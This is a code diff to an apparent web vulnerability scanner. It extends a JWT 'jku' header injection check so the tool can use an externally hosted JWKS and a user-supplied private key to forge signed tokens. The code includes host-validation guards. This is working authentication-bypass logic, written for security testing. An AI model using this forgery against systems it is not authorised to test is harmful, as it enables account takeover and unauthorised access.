@@ -5510,7 +5510,43 @@ class SatriaBaruScanner:
                     from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
                     from cryptography.hazmat.primitives import serialization as _serialization
                     import base64 as _base64
-                    private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                    # Optional external JWKS pair: the user hosts the public JWK
+                    # at SATRIA_JWT_JKU_URL and supplies its matching private PEM.
+                    # Without explicit configuration, use a generated key and a
+                    # same-origin reflected JSON resource as the existing safe fallback.
+                    configured_jku = os.getenv("SATRIA_JWT_JKU_URL", "").strip()
+                    private_pem_env = os.getenv("SATRIA_JWT_JKU_PRIVATE_KEY", "").replace("\\n", "\n").strip()
+                    configured_kid = os.getenv("SATRIA_JWT_JKU_KID", "").strip()
+                    external_jku_ready = False
+                    private_key = None
+                    if configured_jku and private_pem_env:
+                        parsed_jku = urlparse(configured_jku)
+                        valid_jku = (
+                            parsed_jku.scheme in ("http", "https")
+                            and bool(parsed_jku.hostname)
+                            and not parsed_jku.username and not parsed_jku.password
+                        )
+                        host_name = (parsed_jku.hostname or "").lower().rstrip(".")
+                        if host_name in ("localhost", "localhost.localdomain") or host_name.endswith(
+                            (".localhost", ".local", ".internal", ".test", ".invalid")
+                        ):
+                            valid_jku = False
+                        try:
+                            if valid_jku:
+                                literal_ip = ipaddress.ip_address(host_name)
+                                if not literal_ip.is_global:
+                                    valid_jku = False
+                        except ValueError:
+                            pass
+                        if valid_jku:
+                            loaded = _serialization.load_pem_private_key(
+                                private_pem_env.encode(), password=None
+                            )
+                            if isinstance(loaded, _rsa.RSAPrivateKey):
+                                private_key = loaded
+                                external_jku_ready = True
+                    if private_key is None:
+                        private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
                     numbers = private_key.public_key().public_numbers()
 
                     def b64u_int(value: int) -> str:
@@ -5558,20 +5594,23 @@ class SatriaBaruScanner:
                         raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
                         return _base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
 
-                    injected_kid = "satria-jku-" + uuid.uuid4().hex[:10]
+                    injected_kid = (
+                        configured_kid if external_jku_ready and configured_kid
+                        else "satria-jku-" + uuid.uuid4().hex[:10]
+                    )
                     jwk = {
                         "kty": "RSA", "kid": injected_kid, "use": "sig", "alg": "RS256",
                         "e": b64u_int(numbers.e), "n": b64u_int(numbers.n),
                     }
                     jwks_text = json.dumps({"keys": [jwk]}, separators=(",", ":"))
-                    jku_url = None
+                    jku_url = configured_jku if external_jku_ready else None
                     reflected_points = [
                         point for point in points[:80]
                         if getattr(point, "kind", "") == "query"
                         and getattr(point, "name", "")
                         and self._same_origin(getattr(point, "url", "") or "")
                     ]
-                    for point in reflected_points[:12]:
+                    for point in (reflected_points[:12] if not jku_url else []):
                         if not self._within_budget():
                             break
                         separator = "&" if "?" in point.url else "?"
@@ -5612,7 +5651,8 @@ class SatriaBaruScanner:
                         control_header.pop("jku", None)
                         control = self._jwt_sign(control_header, forged_payload, key=private_pem, alg="RS256")
                         confirm(
-                            151, forged, "server mengambil JWKS dari URL jku same-origin yang dapat dikendalikan",
+                            151, forged,
+                            "server mengambil JWKS dari URL jku yang dikendalikan (konfigurasi eksternal pengguna atau refleksi JSON same-origin)",
                             "jwt_jku_header_injection", control=control,
                         )
                 except Exception as exc:
